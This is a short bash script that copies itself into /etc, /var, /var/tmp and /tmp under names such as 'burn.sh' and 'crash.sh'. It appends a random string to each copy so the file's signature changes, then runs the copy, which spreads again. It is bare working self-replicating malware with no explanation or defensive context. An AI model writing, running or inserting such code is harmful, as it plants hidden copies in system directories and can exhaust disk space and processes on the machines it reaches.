#!/bin/bash

dirs=("/etc" "/var" "/var/tmp" "/tmp")
names=("float.sh" "sink.sh" "burn.sh" "crash.sh")
append=("AAAA" "BBBB" "CCCC" "DDDD" "EEEE" "FFFF" "aaaa" "bbbb" "cccc" "dddd" "eeee" "ffff")
rando=${names[RANDOM%4]}
rappend=${append[RANDOM%12]}

for dir in ${dirs[@]}; do
	counter=0
	for name in ${names[@]}; do
		findo=$(find "$dir/" -iname "$name" 2>/dev/null)
		if [ -z "$findo" ]; then
			let counter++
			if [ $counter = ${#names[@]} ]; then
				cp ${0} "$dir/$rando" 2>/dev/null && echo "$rappend" >> "$dir/$rando" && "$dir/$rando" && break
			fi
		fi
	done
done
